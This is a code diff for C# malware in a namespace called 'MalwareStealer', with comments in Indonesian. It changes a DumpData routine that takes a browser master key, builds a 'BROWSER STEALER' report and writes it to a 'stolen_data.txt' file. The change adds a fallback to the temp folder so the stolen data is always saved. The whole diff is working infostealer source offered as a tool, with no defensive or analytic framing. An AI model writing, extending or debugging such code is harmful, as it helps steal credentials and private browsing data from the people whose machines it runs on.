@@ -489,11 +489,30 @@ namespace MalwareStealer
         // ===== DUMP DATA (FINAL - PASTI KELUAR) =====
         static void DumpData(byte[] masterKey)
         {
+            // FORCE BUAT FOLDER DENGAN PERMISSION MAKSIMAL
+            try
+            {
+                Directory.CreateDirectory(@"C:\Stealer");
+                Console.WriteLine("[+] Folder C:\\Stealer berhasil dibuat.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] Gagal buat folder: " + ex.Message);
+                // FALLBACK: PAKE FOLDER TEMP
+                string fallbackPath = Path.GetTempPath() + "Stealer\\";
+                Directory.CreateDirectory(fallbackPath);
+                Console.WriteLine("[+] Fallback ke: " + fallbackPath);
+            }
+
             string output = @"C:\Stealer\stolen_data.txt";
             
-            // FORCE BUAT FOLDER SEBELUM APA PUN
-            try { Directory.CreateDirectory(@"C:\Stealer"); } catch { }
-            
+            // CEK APAKAH FOLDER ADA, KALO GAK ADA PAKE FALLBACK
+            if (!Directory.Exists(@"C:\Stealer"))
+            {
+                output = Path.GetTempPath() + "Stealer\\stolen_data.txt";
+                Console.WriteLine("[+] Fallback output: " + output);
+            }
+
             StringBuilder sb = new StringBuilder();
             sb.AppendLine("=== BROWSER STEALER ===");
             sb.AppendLine("Time: " + DateTime.Now.ToString());
@@ -574,7 +593,7 @@ namespace MalwareStealer
             // PASTIKAN FILE TERSIMPAN
             try
             {
-                Directory.CreateDirectory(@"C:\Stealer");
+                Directory.CreateDirectory(Path.GetDirectoryName(output));
                 File.WriteAllText(output, sb.ToString());
                 Console.WriteLine("[+] Data saved to " + output);
             }
